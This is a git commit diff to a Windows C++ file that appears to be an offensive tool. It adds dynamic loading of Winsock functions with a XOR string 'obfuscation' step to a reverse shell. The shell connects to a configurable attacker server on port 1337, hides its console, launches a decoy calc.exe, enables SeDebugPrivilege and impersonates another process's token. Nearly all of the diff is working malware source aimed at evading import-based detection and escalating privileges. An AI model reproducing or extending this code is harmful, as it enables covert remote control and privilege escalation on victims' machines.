8f784d17732645b62f3e768c84f9cd193935ad1b
Raul <168528192+Raulisr00t@users.noreply.github.com>
2024-06-19 22:58:13 +0400

    Update system_level.cpp

--- system_level.cpp
+++ system_level.cpp
@@ -11,7 +11,59 @@
 #pragma comment(lib,"user32.lib")
 #pragma comment(lib,"ws2_32.lib")
 
+typedef int (WSAAPI* lpfnWSAStartup)(WORD wVersionRequired, LPWSADATA lpWSAData);
+typedef int (WSAAPI* lpfnWSACleanup)(void);
+typedef SOCKET(WSAAPI* lpfnWSASocket)(int af, int type, int protocol, LPWSAPROTOCOL_INFO lpProtocolInfo, GROUP g, DWORD dwFlags);
+typedef int (WSAAPI* lpfnWSAConnect)(SOCKET s, const struct sockaddr* name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
+typedef int (WSAAPI* lpfnRecv)(SOCKET s, char* buf, int len, int flags);
+
+lpfnWSAStartup pWSAStartup;
+lpfnWSACleanup pWSACleanup;
+lpfnWSASocket pWSASocket;
+lpfnWSAConnect pWSAConnect;
+lpfnRecv pRecv;
+
 using namespace std;
+
+char xor_key = 'r00t'; // XOR key for obfuscation
+
+void xor_encode_decode(char* data, size_t len) {
+    for (size_t i = 0; i < len; i++) {
+        data[i] ^= xor_key;
+    }
+}
+
+string obfuscate_string(const string& str) {
+    string obfuscated = str;
+    xor_encode_decode(&obfuscated[0], obfuscated.size());
+    return obfuscated;
+}
+
+string deobfuscate_string(const string& str) {
+    string deobfuscated = str;
+    xor_encode_decode(&deobfuscated[0], deobfuscated.size());
+    return deobfuscated;
+}
+
+void LoadWinsockFunctions() {
+    string dll_name = deobfuscate_string(obfuscate_string("Ws2_32.dll"));
+    HMODULE hWs2_32 = LoadLibraryA(dll_name.c_str());
+    if (!hWs2_32) {
+        cerr << "Failed to load Ws2_32.dll: " << GetLastError() << endl;
+        exit(1);
+    }
+
+    pWSAStartup = (lpfnWSAStartup)GetProcAddress(hWs2_32, deobfuscate_string(obfuscate_string("WSAStartup")).c_str());
+    pWSACleanup = (lpfnWSACleanup)GetProcAddress(hWs2_32, deobfuscate_string(obfuscate_string("WSACleanup")).c_str());
+    pWSASocket = (lpfnWSASocket)GetProcAddress(hWs2_32, deobfuscate_string(obfuscate_string("WSASocketW")).c_str());
+    pWSAConnect = (lpfnWSAConnect)GetProcAddress(hWs2_32, deobfuscate_string(obfuscate_string("WSAConnect")).c_str());
+    pRecv = (lpfnRecv)GetProcAddress(hWs2_32, deobfuscate_string(obfuscate_string("recv")).c_str());
+
+    if (!pWSAStartup || !pWSACleanup || !pWSASocket || !pWSAConnect || !pRecv) {
+        cerr << "Failed to get function addresses: " << GetLastError() << endl;
+        exit(1);
+    }
+}
 
 void ObfuscationProcess() {
     wchar_t process[] = L"C:\\Windows\\System32\\calc.exe";
@@ -82,6 +134,7 @@ void EnablePrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege
 
 int main(int argc, char* argv[]) {
 #ifdef _WIN32
+    LoadWinsockFunctions();
     ObfuscationProcess();
     Sleep(1000);
     FreeConsole();
@@ -89,41 +142,53 @@ int main(int argc, char* argv[]) {
     SOCKET client_shell;
     struct sockaddr_in client_addr;
     STARTUPINFO sinfo;
-    wchar_t ip_address[] = L"192.168.1.1"; // write your server ip
+    wstring ip_address = L"192.168.1.103"; // write your server ip
     int port = 1337; // write your server port
     char data[8192];
 
     WSADATA wsadata;
     int connection;
 
-    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0) {
+    if (pWSAStartup(MAKEWORD(2, 2), &wsadata) != 0) {
         cerr << "WSAStartup failed: " << GetLastError() << endl;
         return 1;
     }
-    client_shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    client_shell = pWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     if (client_shell == INVALID_SOCKET) {
         cerr << "WSASocket failed: " << WSAGetLastError() << endl;
-        WSACleanup();
+        pWSACleanup();
         return 1;
     }
 
     client_addr.sin_family = AF_INET;
     client_addr.sin_port = htons(port);
-    if (InetPton(AF_INET, ip_address, &client_addr.sin_addr) <= 0) {
+
+    // Convert wide string to multibyte string
+    int len = WideCharToMultiByte(CP_UTF8, 0, ip_address.c_str(), -1, NULL, 0, NULL, NULL);
+    if (len == 0) {
+        cerr << "WideCharToMultiByte failed: " << GetLastError() << endl;
+        closesocket(client_shell);
+        pWSACleanup();
+        return 1;
+    }
+    string ip_address_mb(len, 0);
+    WideCharToMultiByte(CP_UTF8, 0, ip_address.c_str(), -1, &ip_address_mb[0], len, NULL, NULL);
+
+    if (InetPtonA(AF_INET, ip_address_mb.c_str(), &client_addr.sin_addr) <= 0) {
         cerr << "Invalid address: " << WSAGetLastError() << endl;
         closesocket(client_shell);
-        WSACleanup();
+        pWSACleanup();
         return 1;
     }
 
-    connection = WSAConnect(client_shell, (SOCKADDR*)&client_addr, sizeof(client_addr), NULL, NULL, NULL, NULL);
+    connection = pWSAConnect(client_shell, (SOCKADDR*)&client_addr, sizeof(client_addr), NULL, NULL, NULL, NULL);
     if (connection == SOCKET_ERROR) {
         cerr << "Connection error: " << WSAGetLastError() << endl;
         closesocket(client_shell);
-        WSACleanup();
+        pWSACleanup();
         return 1;
     }
-    recv(client_shell, data, sizeof(data), 0);
+    pRecv(client_shell, data, sizeof(data), 0);
     memset(&sinfo, 0, sizeof(sinfo));
 
     sinfo.cb = sizeof(sinfo);
@@ -136,7 +201,7 @@ int main(int argc, char* argv[]) {
     if (pid_impersonate == 0) {
         cerr << "Failed to find process ID for " << processName << endl;
         closesocket(client_shell);
-        WSACleanup();
+        pWSACleanup();
         return 1;
     }
 
@@ -158,7 +223,7 @@ int main(int argc, char* argv[]) {
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &CurrentTokenHandle)) {
         cerr << "Error opening the process token: " << GetLastError() << endl;
         closesocket(client_shell);
-        WSACleanup();
+        pWSACleanup();
         return 1;
     }
     EnablePrivilege(CurrentTokenHandle, SE_DEBUG_NAME, TRUE);
@@ -167,7 +232,7 @@ int main(int argc, char* argv[]) {
     if (rProcess == NULL) {
         cerr << "Error opening the process: " << GetLastError() << endl;
         closesocket(client_shell);
-        WSACleanup();
+        pWSACleanup();
         return 1;
     }
 
@@ -175,7 +240,7 @@ int main(int argc, char* argv[]) {
         cerr << "Error opening the process token: " << GetLastError() << endl;
         CloseHandle(rProcess);
         closesocket(client_shell);
-        WSACleanup();
+        pWSACleanup();
         return 1;
     }
 
@@ -184,7 +249,7 @@ int main(int argc, char* argv[]) {
         CloseHandle(hTokenHandle);
         CloseHandle(rProcess);
         closesocket(client_shell);
-        WSACleanup();
+        pWSACleanup();
         return 1;
     }
 
@@ -194,7 +259,7 @@ int main(int argc, char* argv[]) {
         CloseHandle(hTokenHandle);
         CloseHandle(rProcess);
         closesocket(client_shell);
-        WSACleanup();
+        pWSACleanup();
         return 1;
     }
 
